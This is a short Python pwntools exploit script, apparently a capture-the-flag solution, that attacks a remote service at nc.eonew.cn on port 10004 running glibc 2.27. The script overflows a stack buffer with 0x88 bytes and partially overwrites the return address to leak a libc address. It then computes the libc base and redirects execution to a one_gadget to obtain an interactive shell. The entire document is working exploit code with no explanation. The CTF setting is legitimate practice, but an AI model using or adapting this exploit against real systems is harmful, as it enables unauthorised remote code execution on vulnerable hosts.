from pwn import *

###Addr
#  libc2.27
libc_start_offset = 0x21ab0
restart_offset = 0x21b90
one_gadget = 0x10a38c

###Exploit
r = remote('nc.eonew.cn',10004)
r.sendline(b'a'*0x88+p8(restart_offset&0xff))
restart_addr = u64(r.recvline()[0x88:-1]+b'\x00\x00')
libc_base = restart_addr-restart_offset
print(hex(libc_base))
r.sendline(b'a'*0x88+p64(libc_base+one_gadget))
r.interactive()
